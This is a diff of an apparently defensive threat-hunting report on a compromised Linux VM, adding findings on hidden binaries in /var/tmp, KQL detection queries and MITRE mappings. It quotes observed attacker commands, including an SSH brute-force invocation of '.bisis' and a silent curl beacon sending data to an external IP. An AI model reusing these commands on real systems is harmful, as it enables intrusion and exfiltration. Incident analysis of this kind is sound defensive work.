@@ -93,8 +93,6 @@ and InitiatingProcessCommandLine !contains "tenable"
   <img src="https://github.com/user-attachments/assets/754928b6-e72a-4f57-84e3-b083f27333fa" alt="Screenshot description" width="800"/>
 </p>
 
-**Status:** ✅ *Confirmed Malicious*
-
 ---
 
 ### 🔎 Finding #2 — Execution of `.bisis` SSH Brute-Force Binary
@@ -104,6 +102,12 @@ and InitiatingProcessCommandLine !contains "tenable"
 /var/tmp/.update-logs/./.bisis ssh -o /var/tmp/.update-logs/data.json --userauth none --timeout 8
 ```
 [View full command → `observed-commands.md`](./observed-commands.md#bisis-ssh-brute-force-command)
+
+**Associated Device:**  
+`sakel-lunix-2.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net`
+
+**Timeframe:**  
+`March 14, 2025 @ 12:41 UTC` → `March 18, 2025 @ 02:24 UTC`
 
 **Details:**  
 - `.bisis` is a hidden binary located in a non-standard `/var/tmp/.update-logs/` path  
@@ -145,6 +149,12 @@ bash -c "cd /var/tmp/.update-logs ; chmod +x /var/tmp/.update-logs/.bisis ; ulim
 ```
 [View full command → `observed-commands.md`](./observed-commands.md#bisis-repeated-execution-command)
 
+**Associated Device:**  
+`sakel-lunix-2.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net`
+
+**Timeframe:**  
+`March 14, 2025 @ 12:41 UTC` → `March 18, 2025 @ 02:24 UTC`
+
 **Details:**  
 - Executes `.bisis`, `.b`, and `x` — multiple hidden binaries  
 - Uses `ulimit` to raise system limits for high concurrency  
@@ -180,3 +190,126 @@ DeviceFileEvents
 - `T1036` — Masquerading
 
 **Status:** ✅ *Confirmed Malicious*
+
+---
+
+### 🔎 Finding #4 — Malicious File Executions in `/var/tmp`
+
+**Indicator:**  
+Files: `.b`, `.bisis`, `.cache`, `.history`, `Update`, and `x`
+
+**Associated Device:**  
+`sakel-lunix-2.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net`
+
+**Timeframe:**  
+March 14–18, 2025
+
+**Details:**  
+- Multiple hidden binaries executed from `/var/tmp/.update-logs/`
+- `.bisis` was launched with brute-force parameters
+- `x` executed shortly afterward (likely a follow-up loader)
+- Other files like `.b`, `Update`, and `.history` observed in process trees
+
+**Query Used:**
+```kql
+DeviceProcessEvents
+| where FolderPath has "/var/tmp"
+| where FileName in~ (".bisis", ".b", "x", "Update", ".cache", ".history")
+```
+
+> 🖼️ *Insert Screenshot 4: Process tree showing sequence of .bisis → x → Update*
+
+**VirusTotal Score (cache):** `31/64`  
+**Likely Role:** Brute-force agent and follow-up payload loader
+
+**Mapped MITRE Techniques:**  
+- `T1059.004` — Command and Scripting Interpreter: Unix Shell  
+- `T1036` — Masquerading
+
+**Status:** ✅ *Confirmed Malicious*
+
+---
+
+### 🔎 Finding #5 — Exfiltration via Silent `curl` Request
+
+**Indicator:**  
+`curl` to `http://196.251.73.38:47/save-data`
+
+**Associated Device:**  
+`sakel-lunix-2`
+
+**Timeframe:**  
+March 18, 2025
+
+**Details:**  
+- Data sent to external IP over HTTP using `curl --silent`
+- Custom headers used to mimic browser requests
+- Likely contains beacon data or device fingerprinting
+
+**Query Used:**
+```kql
+DeviceNetworkEvents
+| where RemoteIP == "196.251.73.38"
+| where InitiatingProcessFileName == "curl"
+```
+
+```bash
+curl --silent "http://196.251.73.38:47/save-data?IP=45.64.186.20" \
+  -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7" \
+  -H "Accept-Language: en-US,en;q=0.9" \
+  -H "Cache-Control: max-age=0" \
+  -H "Connection: keep-alive" \
+  -H "Upgrade-Insecure-Requests: 1" \
+  --insecure
+```
+
+> 🖼️ *Insert Screenshot 5: Network connection to 196.251.73.38 and process trace showing curl*
+
+**VirusTotal Score:** `15/64`  
+**Likely Role:** Silent exfiltration / beacon
+
+**Mapped MITRE Techniques:**  
+- `T1041` — Exfiltration Over C2 Channel  
+- `T1071.001` — Application Layer Protocol: Web Protocols
+
+**Status:** ✅ *Confirmed Malicious*
+
+---
+
+### 🔎 Finding #6 — Execution of `Update` and `.history` Files
+
+**Indicator:**  
+`.update-logs/Update`, `.history`
+
+**Associated Device:**  
+`sakel-lunix-2`
+
+**Timeframe:**  
+March 16–18, 2025
+
+**Details:**  
+- `Update` and `.history` files executed in temp directory
+- Behavior suggests these were part of a dropper or loader chain
+- Closely associated with `.bisis` launch and brute-force patterns
+
+**Query Used:**
+```kql
+DeviceProcessEvents
+| where FolderPath contains "/var/tmp/.update-logs/"
+| where FileName in~ ("Update", ".history")
+```
+
+> 🖼️ *Insert Screenshot 6: Timeline showing execution order of Update → .bisis → .history*
+
+**VirusTotal Score (Update):** `27/64`  
+**Likely Role:** Dropper and execution log
+
+**Mapped MITRE Techniques:**  
+- `T1059` — Command and Scripting Interpreter  
+- `T1105` — Ingress Tool Transfer
+
+**Status:** ✅ *Confirmed Malicious*
+
+---
+
+
